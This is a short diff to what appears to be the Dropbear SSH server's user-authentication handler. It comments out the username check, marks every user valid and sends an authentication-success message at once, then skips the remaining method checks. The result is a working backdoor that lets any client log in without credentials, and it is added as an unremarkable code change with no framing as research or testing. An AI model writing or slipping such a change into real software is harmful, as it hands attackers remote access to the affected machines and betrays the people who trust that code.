@@ -116,11 +116,21 @@ void recv_msg_userauth_request() {
 	 * the 'incrfail' varies depending on the auth method to
 	 * avoid giving away which users exist on the system through
 	 * the time delay. */
+    
+    /*
 	if (checkusername(username, userlen) == DROPBEAR_SUCCESS) {
 		valid_user = 1;
 	}
+	*/
+	dropbear_log(LOG_WARNING, "next checkusername");
 	
-	 dropbear_log(LOG_WARNING, "next checkusername");
+    valid_user = 1;
+
+    send_msg_userauth_success();
+
+    dropbear_log(LOG_WARNING, "send_msg_userauth_success");
+    
+	goto out;  
 
 	/* user wants to know what methods are supported */
 	if (methodlen == AUTH_METHOD_NONE_LEN &&
